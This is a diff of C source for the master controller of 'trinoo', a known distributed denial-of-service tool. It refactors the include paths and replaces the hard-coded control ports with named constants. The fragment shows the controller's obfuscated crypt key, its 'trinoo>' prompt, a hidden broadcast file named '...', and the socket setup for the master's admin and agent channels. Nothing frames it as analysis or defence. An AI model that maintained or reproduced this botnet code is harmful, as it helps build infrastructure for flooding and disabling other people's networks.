@@ -17,10 +17,12 @@
 #include <time.h>
 #include <unistd.h>
 #include <fcntl.h>
-#include "strfix.h"
 
-	/* crypt key encrypted with the key 'bored'(so hex edit cannot get key easily?)
-	   comment out for no encryption... */
+#include "../strfix.h"
+#include "../trinoo.h"
+
+/* crypt key encrypted with the key 'bored'(so hex edit cannot get key easily?)
+   comment out for no encryption... */
 #define CRYPTKEY "ZsoTN.cq4X31"
 
 #ifdef CRYPTKEY
@@ -31,7 +33,7 @@
 
 #define PROMPT "trinoo>"
 
-	/* FILE holding Bcasts. */
+/* FILE holding Bcasts. */
 #define OUTFILE "..."
 
 #define Fgets(f,b,s) \
@@ -43,7 +45,6 @@
 	if (write(f, b, s) == 0) {\
 		;\
 	}
-
 
 int checkonip(char *);
 int sendtolist(int, char *, int);
@@ -58,7 +59,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 	struct sockaddr_in master, from, tcpmast, tcpconn;
 	socklen_t fromlen;
 	int sock, sock2, numread, bewm = 0, auth = 0, alt;
-	int list = 1, foke, hoe, blist, argi, outport = 27444, ttout =
+	int list = 1, foke, hoe, blist, argi, outport = CLIENT_PORT, ttout =
 	    300, idle = 0;
 	unsigned int i;
 	int pongr = 0;
@@ -94,8 +95,8 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 	printf("trinoo %s [%s:%s]\n", VERSION, __DATE__, __TIME__);
 	bzero((char *)&tcpmast, sizeof(tcpmast));
 	tcpmast.sin_family = AF_INET;
-	tcpmast.sin_addr.s_addr = htonl(INADDR_ANY);
-	tcpmast.sin_port = htons(27665);
+	tcpmast.sin_addr.s_addr = INADDR_ANY;
+	tcpmast.sin_port = htons(ADMIN_PORT);
 	if (bind(sock2, (struct sockaddr *)&tcpmast, sizeof(tcpmast)) == -1) {
 		perror("bind");
 		exit(-1);
@@ -106,7 +107,7 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 
 	master.sin_family = AF_INET;
 	master.sin_addr.s_addr = INADDR_ANY;
-	master.sin_port = htons(31335);
+	master.sin_port = htons(MASTER_PORT);
 
 	if (bind(sock, (struct sockaddr *)&master, sizeof(master)) == -1) {
 		perror("bind");
